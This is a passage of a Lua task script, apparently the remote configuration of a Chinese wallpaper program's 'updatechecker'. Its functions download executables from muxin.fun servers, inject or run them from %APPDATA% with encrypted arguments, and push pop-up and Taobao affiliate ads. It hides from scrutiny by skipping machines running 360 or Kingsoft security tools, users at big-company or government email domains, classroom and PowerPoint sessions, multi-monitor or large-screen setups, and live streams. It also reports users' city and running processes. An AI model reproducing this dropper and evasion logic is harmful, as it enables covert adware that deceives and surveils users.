		"-localcity=" .. p_city,
		"-o=30",
		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/tipsplus.json",
		"-newsurl=http://www.hoteastday.com/api/tnews_news_list/tnews2/bz05",
		"-mutex=C5957E82-CD55-43D1-8FB0-FFF381497FB8", --互斥
		"-writetck=LiveUpdate360,632",
		"-recordshow=0", --默认为1，不配优先级时为0
		"-nopopwhenlong=0",
		"-minireaderpreheat=false",
		"-killprocess=60"
	}

	local localpath = "%APPDATA%\\jcpunch\\account"
	local localname = "flexible"

	local taskidlist, taskid, reportprefix
	taskidlist = {
		"tips12-cs-1"
	}

	if nowtime >= "10:00" and nowtime < "24:00" then
		taskid = taskidlist[1]
		reportprefix = "tips12-cs-1"
		table.insert(args, "-dspurl=http://news.7654.com/tnewsdsp/21/s11/?product_category=23")
	else
		return
	end

	if interval(taskid_last_time(taskid)) < 1 then --最短时间间隔
		return
	end

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	table.insert(args, "-taskid=taskid." .. taskid)
	table.insert(args, "-reportprefix=" .. reportprefix)
	report_kunbang("updatechecker." .. reportprefix, true, true, true, true, 0, 4, true)
	args = extra.encrypte(table.concat(args, " "))
	--return invoke_exe(path,md5,localpath .. "\\" .. localname .. ".exe",args,"GS_tnews.")
	return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tnews.")
end

function execute_tray()
	local path = "http://down1.wallpaper.muxin.fun/tui/tray/v1.0.0.2/traytip-"
	local md5 = {
		"577AFCA8862C690B6195029B6C3BD3BD",
		"682A8FD7FB62CF94062AEEE0519DFD6E"
	}
	local sed = random(1,#md5)

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tray.gif"
	local gif_md5 = "DCDC67C547C92DF728E455EDFD2ADC9A"
	local gif_name = "logo_tray"

	local args = {
		"-project=jcwallpaper",
		"-mutex=AF691E4F-2E33-449A-B6E7-E3902F41D552",
		"-usewebmode=true",
		"-localcity=" .. p_city,
		"-closebuttonjsonurl=http://down1.wallpaper.muxin.fun/n/traytip.json",
		"-adurl=http://domain.thorzip.muxin.fun/ys",
		"-qid=jcwallpaper",
		"-ad=jcwallpaper_shanbiao_1"
		--"-killprocess=60",
	}

	--开机30分钟后弹
	if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
		return
	end

	--路径及进程名定义
	local localpath = "%APPDATA%\\jcbz\\jcbzshanb"
	local localname = "Jcbztray"

	local taskidlist = {
		"tray-1",
		"tray-2"
	}
	
	local taskid = taskidlist[1]
	if nowtime >= "04:00" and nowtime < "14:00" then
		taskid = taskidlist[1]
	elseif nowtime >= "14:00" then
		taskid = taskidlist[2]
	else
		return
	end

	local reportprefix = "tips13-".. showcount(taskidlist,taskid)

	if interval(taskid_last_time(taskid)) < 1 then
		return
	end

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	table.insert(args, "-taskid=taskid." .. taskid)
	table.insert(args, "-reportprefix=" .. reportprefix)
	args = extra.encrypte(table.concat(args, " "))
	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tray.")
	-- return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tray.")
end

function execute_tray11()
	local path = "http://down1.wallpaper.muxin.fun/tui/tray/v1.0.0.2/traytip-"
	local md5 = {
		"577AFCA8862C690B6195029B6C3BD3BD",
		"682A8FD7FB62CF94062AEEE0519DFD6E"
	}
	local sed = random(1,#md5)

	--gif配置
	local gif_url = "http://down1.wallpaper.muxin.fun/tui/tray.gif"
	local gif_md5 = "DCDC67C547C92DF728E455EDFD2ADC9A"
	local gif_name = "logo_tray"

	local args = {
		"-project=jcwallpaper",
		"-mutex=AF691E4F-2E33-449A-B6E7-E3902F41D552",
		"-usewebmode=false",
		"-localcity=" .. p_city
	}

	--开机30分钟后弹
	if (math.abs(tonumber(unicorn.boot_time)) / 60000) < 30 then
		return
	end

	--路径及进程名定义
	local localpath = "%APPDATA%\\jcbz\\jcbzshanb"
	local localname = "Jcbztray"

	local taskidlist, taskid, reportprefix
	taskidlist = {
		"tray3",
		"tray4",
		"tray5",
		"tray6",
		"tray7"
	}

	taskid = taskidlist[1]
	if nowtime >= "00:00" then
		taskid = taskidlist[1]
		reportprefix = "tips13-ds-1"
		table.insert(args,"-landingpage=https://s.click.taobao.com/Jiugwuu")
		table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
		table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash.ico")
		table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-11.zip")
		if interval(taskid_last_time(taskidlist[1])) < 1 and interval(taskid_last_time(taskidlist[1]), "h") >= 4 then
			taskid = taskidlist[2]
			reportprefix = "tips13-ds-2"
			table.insert(args,"-landingpage=https://s.click.taobao.com/2pciJvu")
			table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
			table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash.ico")
			table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-11.zip")
		end
	end

	if day == "01" or day == "31" then
		if interval(taskid_last_time(taskidlist[2])) < 1 and interval(taskid_last_time(taskidlist[2]), "h") >= 2 then
			taskid = taskidlist[3]
			reportprefix = "tips13-ds-3"
			table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
			table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
			table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
			table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
			if interval(taskid_last_time(taskidlist[3])) < 1 and interval(taskid_last_time(taskidlist[3]), "h") >= 2 then
				taskid = taskidlist[4]
				reportprefix = "tips13-ds-4"
				table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
				table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
				table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
				table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
			end
			if interval(taskid_last_time(taskidlist[4])) < 1 and interval(taskid_last_time(taskidlist[4]), "h") >= 2 then
				taskid = taskidlist[5]
				reportprefix = "tips13-ds-5"
				table.insert(args, "-landingpage=https://s.click.taobao.com/Jiugwuu")
				table.insert(args,"-showtraypopupskin=true")		--加闪标预览图
				table.insert(args,"-trayiconurl=http://down1.wallpaper.muxin.fun/tui/tray/trayflash1.ico")
				table.insert(args,"-skinurl=http://down1.wallpaper.muxin.fun/tui/tray/2/tray-111.zip")
			end
		end
	end

	if interval(taskid_last_time(taskid)) < 1 then
		return
	end
	
	--北上珠深杭关闭按钮14*14，北上珠深杭8*8
	if stringinarray(p_city, {"北京","上海市", "上海", "珠海", "深圳", "杭州"}) == false then
		table.insert(args, "-closeimagesize=8x8")
	else
		table.insert(args, "-closeimagesize=14x14")
	end

	local exclude_list = {
		qid = {"guanwang_"},
		version = {},
		process = {},
		md5 = {},
		citys = {}
	}
	if check_enviroment(reportprefix, exclude_list) == false then
		return
	end

	table.insert(args, "-taskid=taskid." .. taskid)
	table.insert(args, "-reportprefix=" .. reportprefix)
	args = extra.encrypte(table.concat(args, " "))
	return invoke_exe(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",args,"JC_tray.")
	-- return invoke_exe_inject(path .. sed .. ".exe",md5,localpath .. "\\" .. localname .. ".exe",gif_url,gif_md5,gif_name,args,"JC_tray.")
end

function main()
	report_kunbang("updatechecker.run-task",true,true,true,true,0,4,true)
	execute_mininewsplus_webmode()
	execute_tips_cs()
	execute_tips_hf()
	execute_tnews_cs()
	if is360 == false and isjs == false then
		execute_tray()
	end
	if nowtime1 < "2020-11-12" and is360 == false then
		--20号之后的加弹
		execute_tray11()
	end
end

--全局变量定义
nowtime=os.date("%H:%M")
nowtime1 = os.date("%Y-%m-%d")
day = os.date("%d")
wekd = os.date("%w")                        --[0 - 6 = 星期天 - 星期六]
p_version = version()
p_qid = qid()
p_uid = uid()
p_city = city_name()
p_first_install_time = first_install_time()
is360 = extra.safe_soft.safe360
isqq = extra.safe_soft.qqpc
isjs = extra.safe_soft.jinshan
iships = extra.safe_soft.hips
is2345 = extra.safe_soft.safe2345
monitor_info = extra.monitor_info
pp_key = extra.pp_key()

--大公司邮箱上报
cn = {
	baidu = "baidu.com",
	jinshan = "cmcm.com",
	alimama = "ali*.com",
	tencent = "tencent.com",
	_360 = "360.cn",
	gov_1 = "gov.cn",
	gov_2 = "gov.com",
	edu_1 = "edu.cn",
	edu_2 = "edu.com"
}
local cname = extra.company_name(project, cn, p_first_install_time)
for key, value in pairs(cn) do
	if string.find(cname, key) ~= nil then
		report_common_oneday("updatechecker", "lua", ".banpop-email", cname)
		return
	end
end


function edu_ppt()
	local result = true
	local report = {}
	local edulist = {
		"TXEDU.exe",
		"pcs.exe",
		"wemeetapp.exe",
		"Zoom.exe",
		"MiaTable.exe",
		"ClassIn.exe",
		"猿辅导.exe",
		"boom.exe"
	}
	for key, value in pairs(edulist) do
		if stringinarray(value, unicorn.process, 1) == true then
			table.insert(report, value .. "_1")
			result = false
		end
	end
	report = table.concat(report, "|")
	if result == false then
		report_common_oneday("updatechecker", "lua", ".edu", report)
	end

	local pptlist = {
		"wpp.exe",
		"POWERPNT.EXE"
	}
	for k, v in ipairs(pptlist) do
		if stringinarray(v, unicorn.process, 1) then
			report_common_oneday("updatechecker", "lua", ".ppt", "")
			result = false
		end
	end
	return result
end
if edu_ppt() == false then
	return
end

--渠道不弹
if stringinarray(p_qid, {"guanwang_"}) == true then
	execute_mininewsplus_gw()
	return
end

--用户屏幕为2个及以上不弹
if extra.monitor_num >= 2 then
	report_onday("updatechecker.banpop-monitor.2", 4)
	return
end
for k, v in ipairs(monitor_info) do
	if v.inches >= 40 then
		report_onday("updatechecker.banpop-monitor", 4)
		return
	end
end

--钉钉直播不弹
local ddlive = extra.window_exists("StandardFrame", "钉钉")
if ddlive == true or stringinarray("tblive.exe", unicorn.process, 1) == true then
	report_common_oneday("updatechecker", "lua", ".banpopup_tblive", "")
	return
end

--wifi不弹
local wifi = {"sam's club"}
if extra.wlan_connected(wifi) == true then
	report_common_oneday("updatechecker", "lua", ".wifi", "")
	return
end

--bb渠道新用户1天后弹出
if interval(p_first_install_time) < 1 and stringinarray(p_qid, {"bb_"}) == true then
	report_onday("pop.banpop-bb", 4)
	return
end

main()
